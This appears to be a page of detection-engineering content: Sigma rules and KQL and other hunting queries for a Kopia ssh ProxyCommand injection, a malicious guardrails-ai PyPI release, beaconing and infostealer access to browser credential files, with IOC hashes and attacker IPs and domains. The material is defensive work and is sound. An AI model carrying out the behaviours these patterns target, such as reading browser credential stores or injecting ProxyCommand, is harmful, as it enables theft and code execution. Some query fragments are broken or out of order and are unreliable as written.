Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Kopia process spawns ssh with -oProxyCommand= argument (CVE-2026-45695)
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] SSH process spawned by Kopia invokes a shell child (ProxyCommand execution)
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
[LLM] Kopia process spawns ssh with -oProxyCommand= argument (CVE-2026-45695) Exploitation High
Detects exploitation of Kopia's unauthenticated SFTP/externalSSH path injection. When the vulnerable /api/v1/repo/exists handler invokes blob.NewStorage with attacker-supplied sshArguments, the kopia process directly forks ssh with a -oProxyCommand= token that OpenSSH then executes via $SHELL -c. The kopia→ssh parent/child with ProxyCommand in the child argv is a near-zero-FP signature of this RCE. Rationale: Uses the exact narrow signature described in the advisory: kopia process (vulnerable handler) directly invoking exec.CommandContext("ssh", ...) with a ProxyCommand token. The string 'ProxyCommand' in an ssh argv whose parent is kopia has effectively no benign use case outside intentional SFTP jump-host setups. Cross-checked against the GHSA advisory, the Kopia v0.22.3 source references in the article, and the fix PR #5354. Cross-checked against: • https://github.com/kopia/kopia/pull/5354 • https://github.com/kopia/kopia/blob/v0.22.3/repo/blob/sftp/sftp_storage.go • https://nvd.nist.gov/vuln/detail/CVE-2026-45695
ATT&CKT1190 T1059.004 T1059.003

| order by TimeGenerated desc

[LLM] SSH process spawned by Kopia invokes a shell child (ProxyCommand execution) Installation High
Detects the second-stage execution arm of CVE-2026-45695: OpenSSH evaluates -oProxyCommand=<cmd> by invoking $SHELL -c <cmd> before any TCP connect. The resulting kopia → ssh → (sh|bash|cmd|powershell) grand-parent/parent/child chain is the artifact of arbitrary code running as the kopia service account. Rationale: This is the exact execution chain the advisory describes — OpenSSH spawns $SHELL -c <attacker_cmd> before attempting TCP, so the shell child of ssh is the observable smoking gun. Pairing it with a kopia grand-parent (via SshPid join) removes essentially all benign ssh ProxyCommand use. Confirmed against the GHSA advisory text and OpenSSH ProxyCommand documented behaviour. Cross-checked against: • https://github.com/advisories/GHSA-2q4c-3mrw-63c3 • https://man.openbsd.org/ssh_config.5#ProxyCommand • https://github.com/kopia/kopia/pull/5354
ATT&CKT1059.004 T1059.001 T1059.003 T1203

    | where FileName in~ ("ssh","ssh.exe")
    | project SshTime = Timestamp, DeviceId, SshPid = ProcessId, SshCmd = ProcessCommandLine, KopiaCmd = InitiatingProcessCommandLine;

let kopia_ssh =

    | where ActingProcessName has_any ("ssh","ssh.exe")

ImProcessCreate

| where ActingProcessName has_any ("sh","bash","dash","zsh","ksh","cmd.exe","powershell.exe","pwsh.exe","pwsh")

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Microsoft's durabletask package on PyPi Compromised. Mini Shai Hulud attacks aga
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → File hash IOCs — endpoint file/process match
Command & Control. Beacon to attacker infrastructure for control and tasking. → Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · Crypto-wallet file/keystore access by non-wallet process · OAuth consent / suspicious app grant

Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high

ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce", "3de04fe2a76262743ed089efa7115f4508619838e77d60b9a1aab8b20d2cc8bf", "85f54c089d78ebfb101454ec934c767065a342a43c9ee1beac8430cdd3b2086f", "c0b094e46842260936d4b97ce63e4539b99a3eae48b736798c700217c52569dc") or SHA1 in~ ("069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce", "3de04fe2a76262743ed089efa7115f4508619838e77d60b9a1aab8b20d2cc8bf", "85f54c089d78ebfb101454ec934c767065a342a43c9ee1beac8430cdd3b2086f", "c0b094e46842260936d4b97ce63e4539b99a3eae48b736798c700217c52569dc") or MD5 in~ ("069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce", "3de04fe2a76262743ed089efa7115f4508619838e77d60b9a1aab8b20d2cc8bf", "85f54c089d78ebfb101454ec934c767065a342a43c9ee1beac8430cdd3b2086f", "c0b094e46842260936d4b97ce63e4539b99a3eae48b736798c700217c52569dc")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce", "3de04fe2a76262743ed089efa7115f4508619838e77d60b9a1aab8b20d2cc8bf", "85f54c089d78ebfb101454ec934c767065a342a43c9ee1beac8430cdd3b2086f", "c0b094e46842260936d4b97ce63e4539b99a3eae48b736798c700217c52569dc") or SHA1 in~ ("069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce", "3de04fe2a76262743ed089efa7115f4508619838e77d60b9a1aab8b20d2cc8bf", "85f54c089d78ebfb101454ec934c767065a342a43c9ee1beac8430cdd3b2086f", "c0b094e46842260936d4b97ce63e4539b99a3eae48b736798c700217c52569dc") or MD5 in~ ("069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce", "3de04fe2a76262743ed089efa7115f4508619838e77d60b9a1aab8b20d2cc8bf", "85f54c089d78ebfb101454ec934c767065a342a43c9ee1beac8430cdd3b2086f", "c0b094e46842260936d4b97ce63e4539b99a3eae48b736798c700217c52569dc")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce", "3de04fe2a76262743ed089efa7115f4508619838e77d60b9a1aab8b20d2cc8bf", "85f54c089d78ebfb101454ec934c767065a342a43c9ee1beac8430cdd3b2086f", "c0b094e46842260936d4b97ce63e4539b99a3eae48b736798c700217c52569dc"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Installation of malicious guardrails-ai==0.10.1 PyPI package (CVE-2026-45758)
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Python process executing transformers.pyz dropped from git-tanstack.com (TeamPCP)
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] DNS lookup for git-tanstack.com TeamPCP C2 staging domain · [LLM] Outbound connection to TeamPCP C2 IP 83.142.209.194 · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
[LLM] Installation of malicious guardrails-ai==0.10.1 PyPI package (CVE-2026-45758) Delivery High
Hunts pip/uv/poetry invocations that pin or resolve to the quarantined guardrails-ai 0.10.1 release. Any host that ran this install must be treated as compromised because the malicious code executes on package import, not just install. Rationale: Pivots on the exact malicious release pin string `guardrails-ai==0.10.1` named in the GHSA advisory. SafeDep + Qualys confirm the 0.10.1 PyPI artifact runs malicious code on import; any host that installed it is presumed compromised regardless of whether the dropper fired. Casing variations are covered for path matches. Cross-checked against: • https://github.com/guardrails-ai/guardrails/issues/1473 • https://safedep.io/mass-npm-supply-chain-attack-tanstack-mistral/ • https://qualysec.com/cybersecurity-news/mini-shai-hulud-worm-compromises/ • https://www.ox.security/blog/shai-hulud-here-we-go-again-170-packages-hit-across-npm-pypi/
ATT&CKT1195.002 T1059.006
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("pip.exe","pip3.exe","python.exe","python3.exe","pythonw.exe","uv.exe","poetry.exe")
   or InitiatingProcessFileName in~ ("pip.exe","pip3.exe","uv.exe","poetry.exe")
| where ProcessCommandLine has "guardrails-ai" or ProcessCommandLine has "guardrails_ai"
| where ProcessCommandLine has "0.10.1"
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath, SHA256
| order by Timestamp desc
let LookbackDays = 30d;
union isfuzzy=true
(
  SecurityEvent
  | where TimeGenerated > ago(LookbackDays)
  | where EventID == 4688
  | where NewProcessName has_any ("pip.exe","pip3.exe","python.exe","python3.exe","pythonw.exe","uv.exe","poetry.exe")
     or ParentProcessName has_any ("pip.exe","pip3.exe","uv.exe","poetry.exe")
  | where CommandLine has "guardrails-ai" or CommandLine has "guardrails_ai"
  | where CommandLine has "0.10.1"
  | project TimeGenerated, Computer, Account=SubjectUserName, NewProcessName, CommandLine, ParentProcessName
),
(
  ImProcessCreate
  | where TimeGenerated > ago(LookbackDays)
  | where ActingProcessName has_any ("pip","pip3","python","python3","uv","poetry")
     or TargetProcessName has_any ("pip","pip3","uv","poetry")
  | where ActingProcessCommandLine has "guardrails-ai" or ActingProcessCommandLine has "guardrails_ai"
  | where ActingProcessCommandLine has "0.10.1"
  | project TimeGenerated, Computer=DvcHostname, Account=ActorUsername, NewProcessName=ActingProcessName, CommandLine=ActingProcessCommandLine, ParentProcessName
)
| order by TimeGenerated desc
title: Installation of Malicious guardrails-ai 0.10.1 PyPI Package (CVE-2026-45758)
id: 8c41a2f9-3b76-4e2d-9e1a-7f1c5a9d4e21
description: Detects pip / uv / poetry / python invocations that install or resolve the malicious guardrails-ai==0.10.1 release published 2026-05-11 (TeamPCP supply-chain attack).
references:
  - https://github.com/advisories/GHSA-xmpw-2vmm-p4p6
  - https://github.com/guardrails-ai/guardrails/issues/1473
  - https://safedep.io/mass-npm-supply-chain-attack-tanstack-mistral/
author: SOC Detection Engineering
date: 2026/05/20
tags:
  - attack.initial_access
  - attack.t1195.002
  - attack.t1059.006
logsource:
  category: process_creation
detection:
  selection_tool:
    Image|endswith:
      - '\pip.exe'
      - '\pip3.exe'
      - '\python.exe'
      - '\python3.exe'
      - '\pythonw.exe'
      - '\uv.exe'
      - '\poetry.exe'
      - '/pip'
      - '/pip3'
      - '/python'
      - '/python3'
      - '/uv'
      - '/poetry'
  selection_pkg:
    CommandLine|contains:
      - 'guardrails-ai==0.10.1'
      - 'guardrails-ai-0.10.1'
      - 'guardrails_ai-0.10.1'
      - 'guardrails-ai 0.10.1'
  condition: selection_tool and selection_pkg
falsepositives:
  - Intentional analyst download of the quarantined artifact in an isolated reverse-engineering sandbox
level: high
(source:windows.sysmon OR source:windows.security OR source:linux.auditd) (@Image:(*\\pip.exe OR *\\pip3.exe OR *\\python.exe OR *\\python3.exe OR *\\uv.exe OR *\\poetry.exe) OR @process.executable.path:(*/pip OR */pip3 OR */python OR */python3 OR */uv OR */poetry)) AND (@CommandLine:(*guardrails-ai==0.10.1* OR *guardrails-ai-0.10.1* OR *guardrails_ai-0.10.1*) OR @process.command_line:(*guardrails-ai==0.10.1* OR *guardrails-ai-0.10.1* OR *guardrails_ai-0.10.1*))
#event_simpleName=ProcessRollup2
| ImageFileName=/(pip|pip3|python|python3|pythonw|uv|poetry)(\.exe)?$/i
| regex("guardrails[-_]ai[ =-]+0\.10\.1", field=CommandLine, flags="i")
| groupBy([aid, ComputerName, UserName, ImageFileName], function=collect([CommandLine, ParentBaseFileName]))
